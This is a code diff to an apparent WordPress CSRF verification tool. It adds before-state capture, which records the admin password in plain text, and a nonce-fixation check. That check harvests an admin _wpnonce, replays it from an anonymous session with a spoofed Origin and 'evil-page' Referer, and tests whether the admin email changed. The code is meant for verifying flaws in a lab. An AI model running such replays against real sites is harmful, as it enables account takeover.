@@ -12090,6 +12090,18 @@ def verify_wordpress_csrf(
                 return (r.stdout or "").strip() == new_email
             return False
 
+        # Capture BEFORE state so evidence shows what changed
+        before_state: dict = {}
+        try:
+            if new_email:
+                _r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
+                before_state["email_before"] = (_r.stdout or "").strip()
+            elif new_pass:
+                before_state["password_before"] = boot.admin_pass
+        except Exception:
+            pass
+        res.evidence["before_state"] = before_state
+
         # variantes de ENTREGA: la peticion normal del metodo declarado (form-encoded, como la
         # haria un <form> real), JSON (si el endpoint es una API REST que espera un body JSON), y
         # el truco clasico de JSON-via-text/plain -- un <form> SI puede mandar Content-Type:
@@ -12131,6 +12143,57 @@ def verify_wordpress_csrf(
             res.evidence["segundo_login_password_nueva"] = confirmed
         elif new_email:
             res.evidence["email_esperado"] = new_email
+
+        # Nonce fixation check: harvest a valid nonce as admin, then try submitting it from anon.
+        # If the endpoint accepts an admin-harvested nonce from the anon session, that is a
+        # cross-session nonce reuse (the nonce is not tied to the requesting session).
+        try:
+            step("csrf: comprobando fijacion de nonce (nonce de admin enviado desde sesion anonima)...")
+            anon_sess_nf = _make_session()
+            # Harvest nonce from a wp-admin form page as admin
+            _nf_page = boot.admin_sess.get(
+                boot.base_url + "/wp-admin/options-general.php", timeout=15, allow_redirects=True)
+            _nf_nonce = None
+            _nf_match = re.search(r'["\']_wpnonce["\']\s*:\s*["\']([a-f0-9]+)["\']', _nf_page.text or "")
+            if not _nf_match:
+                _nf_match = re.search(r'name=["\']_wpnonce["\'].*?value=["\']([a-f0-9]+)["\']',
+                                      (_nf_page.text or ""), re.S)
+            if _nf_match:
+                _nf_nonce = _nf_match.group(1)
+            if _nf_nonce:
+                _nf_payload = {**payload, "_wpnonce": _nf_nonce}
+                # Revert the state-changing parameters to the original values
+                # so we don't repeat the same attack on an already-changed account
+                _nf_new_email = f"noncefixation-{_token()}@binoracle-lab.invalid"
+                if email_p:
+                    _nf_payload[email_p] = _nf_new_email
+                _nf_resp = anon_sess_nf.request(
+                    m, boot.base_url + endpoint, data=_nf_payload if m != "GET" else None,
+                    params=_nf_payload if m == "GET" else None,
+                    headers={"Origin": "https://binoracle-csrf-lab.invalid",
+                             "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"},
+                    timeout=15)
+                _nf_accepted = _nf_resp.status_code not in (401, 403)
+                # Check if the state actually changed using the new email
+                _nf_effect = False
+                if email_p and _nf_accepted:
+                    _r2 = lab.wp_cli("user", "get", boot.admin_user,
+                                     "--field=user_email", timeout=20)
+                    _nf_effect = ((_r2.stdout or "").strip() == _nf_new_email)
+                res.evidence["nonce_fixation"] = {
+                    "nonce_harvested": _nf_nonce,
+                    "anon_status": _nf_resp.status_code,
+                    "anon_accepted": _nf_accepted,
+                    "state_changed": _nf_effect,
+                    "finding": "CROSS-SESSION NONCE REUSE" if _nf_effect else (
+                        "nonce accepted by server but no state change" if _nf_accepted else
+                        "nonce rejected from anon session (nonce is session-bound)"),
+                }
+                if _nf_effect:
+                    step("csrf: NONCE FIXATION CONFIRMADA — nonce de admin funciona desde sesion anonima")
+                    res.evidence["nonce_fixation_confirmed"] = True
+        except Exception:
+            pass
 
         if confirmed:
             res.verified = True
